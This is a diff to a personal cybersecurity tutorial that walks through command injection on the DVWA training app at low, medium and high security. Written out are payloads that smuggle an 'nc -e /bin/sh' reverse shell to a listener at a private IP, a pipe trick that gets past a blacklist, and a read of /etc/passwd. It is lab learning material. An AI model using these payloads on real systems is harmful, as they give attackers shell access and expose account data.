@@ -121,6 +121,8 @@ Types of Attacks:</br>
 Example</br>
 ![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c3ab51b0-0803-4ae1-88ba-7427665a438d)</br>
 
+# Web Pentesting
+
 ### Starting Apache Server
 ```
 sudo service apache2 start
@@ -149,7 +151,7 @@ sudo service apache2 reload
 ### DVWA installed
 ![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/e832204c-cb22-43cd-8ed9-19aec02f00df)
 
-## Command Injection using DVWA
+## Command Injection using DVWA with Low Level Security
 ![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/34b9008e-a81c-49b2-ac04-4f24ac69ed8e)
 ![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c2850104-fc23-4d87-8e69-d39e9bcb9357)
 We can see that we are getting successful responses from the website.
@@ -166,9 +168,65 @@ nc -vv -l -p 8080
 ![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/4c7be283-a663-4641-8a6c-d652cecc7f5b)
 
 ### Giving connection of the whole server to the terminal
-To execute the netcat services -> nc -e /bin/sh 192.168.86.226 8080 </br>
+To execute the netcat services -> 192.168.86.226; nc -e /bin/sh 192.168.86.226 8080 </br>
 In Linux, netcat is always hosted in the bin folder. </br>
 Here, we are making a connection from WebApp to the Operating System. A command in which we will use the IP of our OS to fire on the website by which we will get a connection in our terminal. </br>
+
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/0b1f284b-a82f-4b87-a7a1-e6dbaba39ffe)
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/fc70f6a4-d6eb-4c7c-b58c-78b6d87d5f59)
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/3d7495bf-0460-4b7f-810f-cad3a109e632)
+
+## Changing the DVWA Security to Medium
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c07cee8b-17fb-4c6b-a6bd-50ef92d9a2a7)
+
+You can start netcat services again.
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/5bb1b345-78b6-4196-ac15-c4b5dbfacd23)
+
+Edit command injection source file in DVWA
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/23cb310d-017a-4ba5-bea1-584c3c12b28d)
+
+Making connections over netcat services as well </br>
+Command:
+```
+192.168.86.226 | nc -e /bin/sh 192.168.86.226 8080
+```
+
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/4cdd743f-6f9e-4862-a024-100457c575b6)
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/0f5ff2b3-d064-40f3-96f0-d926a46a7b62)
+
+### Breaching the higher level of security
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/f4518d06-9a09-4f3a-b0bc-562cf0431c99)
+
+### Command Injection Source File of DVWA for High Level of Security
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/e4cd8b9e-7c9a-49a9-9fa8-530b1fd7d06f)
+## Blacklist
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/80c0a582-d984-43d1-b026-c0f5a17c55b3)
+
+Command:
+```
+192.168.86.226|pwd
+```
+
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/ad900b33-00b0-480f-a942-2d17408a48e1)
+
+Making connections over netcat services as well </br>
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/aab6c956-0cff-49c0-81ec-07b3eadc7013)
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/881e0076-4fca-45e7-be9a-ac9cbf147416)
+
+Command:
+```
+192.168.86.226|nc -e /bin/sh 192.168.86.226 8080 -> Not Working
+```
+
+### Jumping on to the default password files: from etc folders
+From this, we can find the system's default passwords.
+```
+192.168.86.226|cat /etc/passwd
+```
+![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/05e3cca3-760f-4070-a743-0be6e8479bb7)
+
+
+
 
 
 
